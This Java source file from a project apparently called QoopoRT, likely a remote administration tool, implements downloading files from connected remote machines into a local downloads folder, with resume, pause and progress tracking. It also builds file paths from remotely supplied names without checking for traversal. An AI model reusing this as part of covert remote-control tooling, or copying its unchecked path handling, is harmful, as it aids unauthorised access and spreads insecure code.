/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package qooport.modulos.archivos.transferencia;

import comunes.CFG;
import java.io.File;
import java.io.FileOutputStream;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.ImageIcon;
import network.Conexion;
import network.ConexionServer;
import qooport.Global;
import qooport.asociado.Asociado;
import qooport.avanzado.QoopoRT;
import qooport.utilidades.Compresor;
import qooport.utilidades.Protocolo;
import qooport.utilidades.Util;
import qooport.utilidades.contador.ContadorBPS;

/**
 *
 * @author aigarcia
 */
public class Descarga extends Transferencia {

    private String archivoAdescargar;
    private String rutaADescargar;
    private File archivoTmp;

    public Descarga(Conexion conexion) {
        this.conexion = conexion;
        contador = new ContadorBPS();
        contador.start();
    }

    public Descarga(Asociado asociado, String archivo, String rutaDescargar) {
        this.asociado = asociado;
        this.archivoAdescargar = archivo;
        this.rutaADescargar = rutaDescargar;
        contador = new ContadorBPS();
        contador.start();
    }

    @Override
    public void iniciar() {
        activo = true;
        start();
    }

    @Override
    public void detener() {
        try {
            detener = true;
            activo = false;
            sleep(300);
            ok = false;
            interrupt();
        } catch (Exception ex) {
            Logger.getLogger(Descarga.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    @Override
    public void pausar() {
        pausado = true;
    }

    @Override
    public void continuar() {
        pausado = false;
    }

    @Override
    public void reanudar() {
        asociado.descargar(archivoAdescargar, rutaADescargar, actual);
    }

    @Override
    public void run() {
        try {
            if (asociado != null && asociado.isConexionDirecta()) {
                conexion = new Conexion(asociado.getHostConexion(), asociado.getPuertoTransferencia(), ConexionServer.TCP);
                this.bufferSize = conexion.getReceiveBufferSize();
                conexion.escribirObjeto(Util.comprimirObjeto(Asociado.crearComando(Protocolo.ADMIN_ARCHIVOS_DESCARGAR, 2, new String[]{archivoAdescargar, rutaADescargar})));
                conexion.flush();
            }
        } catch (Exception e) {

        }
        if (conexion == null) {
            System.out.println("No hay conexión para descarga de archivos");
            return;
        }
        agregarAlGestor();
        try {
            if (accionInicial != null) {
                accionInicial.ejecutar();
            }
            boolean antiguo = false;
            //<ag> 25/08/2017 Se cambia la forma de trasnferir archivos, ahora se envia un objeto que puede recibir cualqueir 
            // limite de parametros y no tener problemas futuros alagregar o quitar parametros
            Object config = conexion.leerObjeto();
            actual = 0;//posicion del archivo a recibir, si es una reanudacion se actualizara mas abajo 

            if (config instanceof CFG) {
                if (asociado == null) {
                    asociado = (Asociado) QoopoRT.SERVIDORES.get((String) ((CFG) config).obtenerParametro("id"));
                }
                idInformacion = asociado.getInformacion();
                try {
                    setIcono(new ImageIcon((byte[]) ((CFG) config).obtenerParametro("icono")));
                } catch (Exception e) {
                }

                rutaADescargar = (String) ((CFG) config).obtenerParametro("rutaPadre");
                rutaADescargar = rutaADescargar.replace("\\", "/");
                //-----------            
                //Paso 4 Leer el nombre del archivo
                nombreArchivo = (String) ((CFG) config).obtenerParametro("nombre");
                //-------------------------------

                //paso 5 leer tamaño del archivo para poder identificar el progreso de descarga
                total = (Long) ((CFG) config).obtenerParametro("largo");
                hash = (String) ((CFG) config).obtenerParametro("MD5");
                actual = (Long) ((CFG) config).obtenerParametro("offset");
                archivoAdescargar = (String) ((CFG) config).obtenerParametro("original");

            } else {
                //anterior version donde se enviaba los parametros uno a uno en la linea

                //paso 1 Leer ID del cliente            
                byte[] bytesIdServer = (byte[]) config;
                String ID = Asociado.parsearCadena(bytesIdServer, antiguo);
                if (!QoopoRT.SERVIDORES.containsKey(ID)) {
                    antiguo = true;
                    ID = Asociado.parsearCadena(bytesIdServer, antiguo);
                }

                if (asociado == null) {
                    asociado = (Asociado) QoopoRT.SERVIDORES.get(ID);
                }
                idInformacion = asociado.getInformacion();
                //-------------------------------------------

                //paso 2 Leer Icono del archivo para mostrar
                byte[] bytesIcono = null;
                try {
                    bytesIcono = Compresor.descomprimirGZIP((byte[]) conexion.leerObjeto());
                } catch (Exception e) {
                    bytesIcono = null;
                }
                try {
                    setIcono(new ImageIcon(bytesIcono));
                } catch (Exception e) {
                }
                //----------------------------------------------

                // Paso 3 Leer la ruta padre donde se va a ubicar el archivo
                rutaADescargar = asociado.leerCadena((byte[]) conexion.leerObjeto());
                rutaADescargar = rutaADescargar.replace("\\", "/");
                //-----------            
                //Paso 4 Leer el nombre del archivo
                nombreArchivo = asociado.leerCadena((byte[]) conexion.leerObjeto());
                //-------------------------------

                //paso 5 leer tamaño del archivo para poder identificar el progreso de descarga
                total = conexion.leerLong();
                //---------------------------------
            }
            //paso 6 configurar la ruta de descarga del archivo
            String nombreTmp = nombreArchivo + ".par";
            File carpeta = null;

            if (rutaADescargar.contains(";")) {
                String rutas[] = rutaADescargar.split(";");
                try {
                    rutas[1] = rutas[1].replace(":", "");//elimino los 2 puntos de las unidades ps no se peuden crear carpetas asi en windows
                } catch (Exception e) {
                }
                if (rutas[0] == null || rutas[0].isEmpty()) {
                    carpeta = new File(asociado.getdDescargas(), rutas[1]);// en la carpeta descargas del servidor
                } else {
                    try {
                        carpeta = new File(Util.procesaNombreCarpeta(rutas[0], asociado), rutas[1]);// en la carpeta seleccionada en el gestor de archivos
                    } catch (Exception e) {
                        carpeta = new File(Util.procesaNombreCarpeta(rutas[0], asociado));//no hay la carpeta del archiov, viene el archivo solo sin carpeta
                    }
                }
            } else {
                carpeta = new File(asociado.getdDescargas(), rutaADescargar);// en la carpeta descargas del servidor
            }

            if (!carpeta.exists()) {
                carpeta.mkdirs();
            }
            //------------------------------------------------------

            //paso 7 Preparar para recibir el archivo
            archivoTmp = new File(carpeta, nombreTmp);
            FileOutputStream out;
            if (actual > 0) {
                out = new FileOutputStream(archivoTmp, true);
            } else {
                out = new FileOutputStream(archivoTmp);
            }
            byte[] buf = new byte[bufferSize];
            int i;
            Global.transferencias.progresoDescargas.agregarTotal(total);
            tInicio = System.currentTimeMillis();

            //       FileChannel ch = out.getChannel();
            //       ch.position(offset);
            //       ch.write(ByteBuffer.wrap(data));
            //paso 8 recibir el archivo
            while ((i = conexion.read(buf)) > 0 && activo) {
                out.write(buf, 0, i);
                asociado.agregarRecibidos(i);
                actual += i;
                avance = (int) (actual * 100L / total);
                contador.agregar(i);
                if (accionProgreso != null) {
                    accionProgreso.ejecutar();
                }
                Global.transferencias.progresoDescargas.agregarAvance(i);
                while (pausado) {
                    sleep(50);
                }
            }
            out.close();

            if (!detener) {
                //Paso 9 renombrar el archivo con el nombre .par al nombre real
                archivo = new File(carpeta, nombreArchivo);
                if (archivo.exists()) {
                    archivo.delete();
                }
                archivoTmp.renameTo(archivo);
                out = null;
                buf = null;

                //--------------------------------------------
                //Paso 10 Ejecutar acciones finales y liberar recursos
                if (accionFinalizar != null) {
                    accionFinalizar.ejecutar();
                }
                ok = true;
            }
            tFinal = System.currentTimeMillis();
        } catch (Exception ex) {
            ex.printStackTrace();
        } finally {
            activo = false;
            try {
                conexion.cerrar();
            } catch (Exception ex) {

            }
            conexion = null;
            if (QoopoRT.instancia != null) {
                Global.transferencias.progresoDescargas.quitarAvance(total);
                Global.transferencias.progresoDescargas.quitarTotal(total);
            }
            QoopoRT.ejecutarAccionesDescarga();
        }

    }

}
